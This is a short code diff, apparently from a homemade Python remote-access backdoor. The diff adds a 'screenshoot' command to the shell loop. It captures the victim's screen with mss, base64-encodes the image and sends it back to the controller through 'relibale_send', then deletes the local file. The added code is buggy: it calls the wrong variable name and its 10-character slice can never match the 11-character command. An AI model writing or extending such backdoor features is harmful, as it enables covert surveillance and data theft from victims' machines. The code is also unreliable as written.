@@ -9,6 +9,11 @@ import shutil
 import sys
 import time
 import requests
+from mss import mss
+
+def screenshoot():
+	with  mss() as screenshot:
+		screenshoot.shot()
 
 def downlaod(url):
 	get_response = requests.get(url)
@@ -71,8 +76,15 @@ def shell():
 			except Exception as e:
 				print(e)
 				relibale_send("failed to dowload".encode('utf-8'))
-
-
+		elif command[:10] == "screenshoot":
+			try:
+				screenshoot()
+				with open("monitor-1.png", "rb") as sc:
+					relibale_send(base64.b64encode(sc.read()))
+				os.remove("monitor-1.png")
+			except Exception as e:
+				print(e)
+				relibale_send("[!!] Failed to take screenshoot. ")
 		
 		else:
 			try:
